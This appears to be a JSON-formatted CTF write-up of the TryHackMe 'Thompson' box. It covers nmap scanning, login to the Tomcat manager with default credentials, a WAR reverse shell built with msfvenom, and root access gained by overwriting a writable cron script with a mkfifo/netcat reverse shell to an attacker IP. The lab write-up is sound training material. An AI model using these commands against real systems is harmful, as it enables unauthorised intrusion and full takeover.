{
    "note":"title must match route name in App.js",
    "title":"Thompson",
    "path":"thompson",
    "tags":["easy","ctf", "box", "thm","web","nsfvenom", "linux", "privesc", "login panel", "nc", "rce", "reverse shell", "upgrade shell", "user enumeration"],
    "date":"27/06/2023",
    "location": "./writeup/",
    "banner":"writeup/thompson/banner.gif",
    "type":"writeup",
    "search":[
        {
            "section":"Scanning",
            "description":"Scanning with nmap and finding the host exposing posts 22 ssh, 8009 ajp13, and 8080 http"
        },
        {
            "section":"Tomcat credentials",
            "description":"Guessing Tomcat Manager panel credential from a common credals list for Tomcat via manual user and passowrd enumeration"
        },
        {
            "section":"Revers shell",
            "description":"Creating malicious WAR file with msfvenom for reverse shell"
        },
        {
            "section":"Revers shell",
            "description":"Upgrading from non interactive shell to fully interactive shell with Bahs (no Python)"
        },
        {
            "section":"Code execution",
            "description":"Hijacking and redirecting code execution injecting malicious command to enumerate users and system"
        },
        {
            "section":"Code execution",
            "description":"Injecting malicious code to execute reverse shell as admin"
        }
    ],
    "body":[
        {
            "id":"Thompson",
            "title":"<h1> <span style=\"color:#da1953\">Tho</span>mpson</h1><hr>",
            "body":[
                {
                    "id":"banner",
                    "title":"",
                    "body":[
                        "<img src=\"/cyber/writeup/thompson/banner.gif\" alt=\"\">"
                    ]
                },
                {
                    "id":"Scanning",
                    "title":"<hr><h1><span style=\"color:#da1953\">Sca</span>nning</h1>",
                    "body":[
                        "<p><pre># Nmap 7.94SVN scan initiated Thu Feb  6 08:32:29 2025 as: nmap -sC -sV -oN nmap 10.10.23.2<br>Nmap scan report for 10.10.23.2<br>Host is up (0.025s latency).<br>Not shown: 997 closed tcp ports (conn-refused)<br>PORT     STATE SERVICE VERSION<br>22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)<br>| ssh-hostkey: <br>|   2048 fc:05:24:81:98:7e:b8:db:05:92:a6:e7:8e:b0:21:11 (RSA)<br>|   256 60:c8:40:ab:b0:09:84:3d:46:64:61:13:fa:bc:1f:be (ECDSA)<br>|_  256 b5:52:7e:9c:01:9b:98:0c:73:59:20:35:ee:23:f1:a5 (ED25519)<br>8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)<br>|_ajp-methods: Failed to get a valid response for the OPTION request<br>8080/tcp open  http    Apache Tomcat 8.5.5<br>|_http-favicon: Apache Tomcat<br>|_http-title: Apache Tomcat/8.5.5<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br># Nmap done at Thu Feb  6 08:32:37 2025 -- 1 IP address (1 host up) scanned in 8.30 seconds</pre></p>",
                        "<p>I have 3 pen ports: 22 ssh, 8009 ajp13 (Apache Jserv) and 8080 http (Tomcat).</p>"
                    ]
                },
                {
                    "id":"Tomcat credentials",
                    "title":"<h1><span style=\"color:#da1953\">Tom</span>cat credentials</h1>",
                    "body":[
                        "<p>Accesssing the address <i>http://challenge.ip:8080</i> I am able to access the tomcat home page.</p>",
                        "<p><img src=\"/cyber/writeup/thompson/tomcathome.PNG\"></p>",
                        "<p>By Clicking \"Manage App\" I can attemp a log into the admin panel.</p>",
                        "<p><img src=\"/cyber/writeup/thompson/login.PNG\"></p>",
                        "<p>The default credentials are <b>tomcat:s3cret</b> which I guessed tried some common combination of username and password form this <a href=\"https://github.com/netbiosX/Default-Credentials/blob/master/Apache-Tomcat-Default-Passwords.mdown\">link</a>.</p>",
                        "<p>Once logged in I had the possibility to upload a WAR file.</p>",
                        "<p><img src=\"/cyber/writeup/thompson/upload.jpg\"></p>"
                        
                    ]
                },
                {
                    "id":"Reverse Shell",
                    "title":"<h1><span style=\"color:#da1953\">Rev</span>ers shell</h1>",
                    "body":[
                        "<p>To craft the WAR file I have used MSFVENOM, and I found the comand line on <a href=\"https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/\">Google</a>. The line I used was \"non-meterpreter web payload (WAR)\": <code>msfvenom -p java/jsp_shell_reverse_tcp LHOST&lt;IP&gt; LPORT=&lt;PORT&gt; -f war &gt; shell.<br>ENTER<br>ENTER</code>. Once created the file and uploaded I started a NetCat linstener and then visited the uploaded WAR file Link.</p>",
                        "<p><img src=\"/cyber/writeup/thompson/reverseshell.PNG\"></p>",
                        "<p>I have a non interative shell. To upgrade it to an interactive shell I used the fllowing commands:</p>",
                        "<p><pre>/usr/bin/script -qc /bin/bash /dev/null<br>CTRZ+Z<br>stty raw -echo; fg; reset</pre></p>",
                        "<p><img src=\"/cyber/writeup/thompson/upgradedshell.PNG\"></p>",
                        ""
                    ]
                },
                {
                    "id":"Code execution",
                    "title":"<h1><span style=\"color:#da1953\">Cod</span>e execution</h1>",
                    "body":[
                        "<p>Obviously, the first thing that came to my mind was to look for the user flag in the home directory.</p>",
                        "<p><pre>tomcat@ubuntu:/$ cd /home/jack/<br>tomcat@ubuntu:/home/jack$ ls -la<br>total 48<br>drwxr-xr-x 4 jack jack 4096 Aug 23  2019 .<br>drwxr-xr-x 3 root root 4096 Aug 14  2019 ..<br>-rw------- 1 root root 1476 Aug 14  2019 .bash_history<br>-rw-r--r-- 1 jack jack  220 Aug 14  2019 .bash_logout<br>-rw-r--r-- 1 jack jack 3771 Aug 14  2019 .bashrc<br>drwx------ 2 jack jack 4096 Aug 14  2019 .cache<br>-rwxrwxrwx 1 jack jack   26 Aug 14  2019 id.sh<br>drwxrwxr-x 2 jack jack 4096 Aug 14  2019 .nano<br>-rw-r--r-- 1 jack jack  655 Aug 14  2019 .profile<br>-rw-r--r-- 1 jack jack    0 Aug 14  2019 .sudo_as_admin_successful<br>-rw-r--r-- 1 root root   39 Feb  7 05:14 test.txt<br>-rw-rw-r-- 1 jack jack   33 Aug 14  2019 user.txt<br>-rw-r--r-- 1 root root  183 Aug 14  2019 .wget-hsts</pre></p>",

                        "<p>Here I can see that not only I am able to retrieve the flag but there is a script name <b>id.sh</b> that has read and write permission. By opening the file it is clear that it is executing the command <b>id</b> and saving the output in the file named <i>text.txt</i>.</p>",
                        "<p><pre>tomcat@ubuntu:/home/jack$ cat user.txt<br>39400c90bc683a41a8935e4719f181bf</pre></p>",
                        "<p><pre>tomcat@ubuntu:/home/jack$ cat id.sh<br>#!/bin/bash<br>id > test.txt</pre></p>",
                        "<p>Having read and write permission on <i>id.sh</i> I was able to enumerate the sudo privilege to check which command the user jack was able to execute as sudo without the password. The command used to enumerate was <code>sudo -l</code> and the command used to inject the code inside the <i>id.sh</i> file was <code>echo -e '#!/bin/bash'\"\\nsudo -l > text.txt\" > /home/jack/id.sh</code></p>",
                        "<p><pre>tomcat@ubuntu: echo -e '#!/bin/bash'\"\nsudo -l > text.txt\" > /home/jack/id.sh              <br>tomcat@ubuntu:/home/jack$ cat id.sh <br>#!/bin/bash<br>sudo -l > text.txt<br>tomcat@ubuntu:/home/jack$ cat text.txt <br>Matching Defaults entries for root on ubuntu:<br>    env_reset, mail_badpass,<br>    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin<br><br>User root may run the following commands on ubuntu:<br>    (ALL : ALL) ALL</pre></p>"
                    ]
                },
                {
                    "id":"Shell as root",
                    "title":"<h1><span style=\"color:#da1953\">Shel</span>l as root</h1>",
                    "body":[
                        "<p>This means that I can execute all commands as sudo without the password. It also means that I can execute a reverse shell with <b>sudo</b> to obtain access as root. The command to inject the payload is: <code>echo -e '#!/bin/bash'\"\nsudo rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.21.112.161 5555 >/tmp/f\" > /home/jack/id.sh</code>. Before executing the command I have to open a NetCat (NC) listener on port 5555 matching the payload port number.</p>",
                        "<p><pre><b>$</b> nc -lvnp 5555<br>listening on [any] 5555 ...<br>connect to [10.21.112.161] from (UNKNOWN) [10.10.247.245] 38362<br>/bin/sh: 0: can't access tty; job control turned off<br># whoami<br>root<br># cat /root/root.txt<br>d89d5391984c0450a95497153ae7ca3a  </pre></p>"
                    ]
                }
            ]
        }
    ]
}
